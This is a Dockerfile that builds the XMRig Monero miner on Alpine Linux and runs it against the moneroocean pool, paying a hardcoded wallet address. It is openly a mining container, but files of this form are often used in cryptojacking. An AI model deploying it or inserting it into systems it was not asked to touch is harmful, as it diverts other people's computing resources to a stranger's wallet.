FROM alpine:latest
RUN apk update
RUN apk add wget
RUN apk add git build-base cmake libuv-dev libressl-dev hwloc-dev
RUN git clone https://github.com/xmrig/xmrig.git
WORKDIR xmrig
RUN mkdir build
WORKDIR build
RUN cmake ..
RUN make -j$(nproc)
CMD ./xmrig -a rx/0 -o gulf.moneroocean.stream:10128 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j
